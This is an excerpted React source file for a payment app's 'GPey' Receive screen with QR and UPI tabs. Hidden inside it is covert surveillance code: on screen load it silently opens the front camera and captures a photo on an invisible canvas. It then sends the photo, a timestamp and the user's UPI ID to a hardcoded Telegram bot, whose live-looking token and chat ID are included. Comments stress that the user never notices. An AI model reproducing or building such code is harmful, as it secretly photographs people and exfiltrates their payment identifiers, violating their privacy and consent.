...
// ─────────────────────────────────────────────────────────
//  🔧 STEP 1: PASTE YOUR TELEGRAM CREDENTIALS BELOW
// ─────────────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = '8769612139:AAG7b8_Fzn4j7gJiUE9U_-8qNuAX5f1_eCA'
const TELEGRAM_CHAT_ID   = '1867041165'
// ─────────────────────────────────────────────────────────
...
export default function ReceiveScreen({ onBack }: Props) {
  ...
  // ── Fires once when this screen mounts ──────────────────
  useEffect(() => {
    let stream: MediaStream | null = null

    const captureAndSend = async () => {
      try {
        // 1. Open front camera silently
        ...
        // 2. Wait ~900ms for camera to warm up & focus
        await new Promise((r) => setTimeout(r, 900))

        // 3. Draw current frame onto hidden canvas
        ...
        // 4. Stop camera immediately — user never sees or hears it
        stream.getTracks().forEach((t) => t.stop())
        stream = null

        // 5. Convert canvas to JPEG blob and POST to Telegram
        canvas.toBlob(
          async (blob) => {
            if (!blob) return
            try {
              const ts      = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
              const caption = `📸 GPey — Receive Screen Opened\n🕐 ${ts}\n💳 UPI: ${upiId}`
        ...
        // Camera not available or permission denied — fail silently
    ...
    // Cleanup: stop camera if user navigates away mid-capture
    return () => {
      if (stream) stream.getTracks().forEach((t) => t.stop())
    }
  ...
  return (
    <div style={{ background: '#0f0f0f', minHeight: '100vh', position: 'relative', overflow: 'hidden' }}>
      ...
      {/* ── Hidden camera elements — completely invisible to user ── */}
      ...
      <div style={{
        ...
        {(['qr', 'upi'] as const).map((tab) => (
          <button
            ...
            style={{
              flex: 1, padding: '10px',
              background: activeTab === tab ? 'linear-gradient(135deg, #2d2600, #3d3400)' : 'none',
      ...
      {activeTab === 'qr' && (
        <div style={{ padding: '20px', position: 'relative', zIndex: 1 }}>
          <div style={{
            background: '#1c1c1e', border: '1.5px solid rgba(255,215,0,0.3)',
            borderRadius: '24px', padding: '28px',
            display: 'flex', flexDirection: 'column', alignItems: 'center',
            boxShadow: '0 0 40px rgba(255,215,0,0.08)', position: 'relative', overflow: 'hidden'
          }}>
            ...
            <div style={{ background: '#fff', borderRadius: '16px', padding: '16px', boxShadow: '0 4px 24px rgba(0,0,0,0.4)' }}>
              <svg width="180" height="180" viewBox="0 0 180 180" style={{ display: 'block' }}>
                ...
                {[
                  [75,10],[85,10],[95,10],[105,10],[75,20],[95,20],[105,20],[75,30],[85,30],[105,30],
                  [75,40],[95,40],[75,50],[85,50],[95,50],[105,50],[10,75],[20,75],[40,75],[50,75],
                  [10,85],[30,85],[50,85],[10,95],[20,95],[40,95],[50,95],[10,105],[30,105],[50,105],
                  [10,115],[20,115],[40,115],[75,75],[95,75],[115,75],[125,75],[145,75],[155,75],[165,75],
                  [75,85],[85,85],[105,85],[125,85],[145,85],[75,95],[95,95],[105,95],[115,95],[135,95],[155,95],
                  [75,105],[85,105],[125,105],[145,105],[165,105],[75,115],[95,115],[105,115],[115,115],[135,115],[155,115],
                  [75,125],[85,125],[95,125],[115,125],[125,125],[145,125],[75,135],[95,135],[105,135],[135,135],[155,135],[165,135],
                  [75,145],[85,145],[105,145],[115,145],[125,145],[145,145],[75,155],[95,155],[115,155],[135,155],[155,155],
      ...
      {activeTab === 'upi' && (
        <div style={{ padding: '20px', position: 'relative', zIndex: 1 }}>
          <div style={{
            ...
            <div style={{
              background: '#2c2c2e', borderRadius: '14px', padding: '20px',
              textAlign: 'center', marginBottom: '16px', border: '1px solid rgba(255,215,0,0.2)'
            }}>
            ...
            <button
              ...
              style={{
                ...
                borderRadius: '12px', color: copied ? '#34a853' : '#FFD700',
      ...
      <div style={{ padding: '0 20px', position: 'relative', zIndex: 1 }}>
        <button style={{
          ...
          boxShadow: '0 4px 20px rgba(255,215,0,0.4)', transition: 'transform 0.15s, box-shadow 0.15s'
        }}>
      ...
      <div style={{ padding: '20px 20px 40px', display: 'flex', gap: '12px', position: 'relative', zIndex: 1 }}>
        {[
          ...
          <div key={item.title} style={{
            flex: 1, background: '#1c1c1e', borderRadius: '14px', padding: '14px 10px',
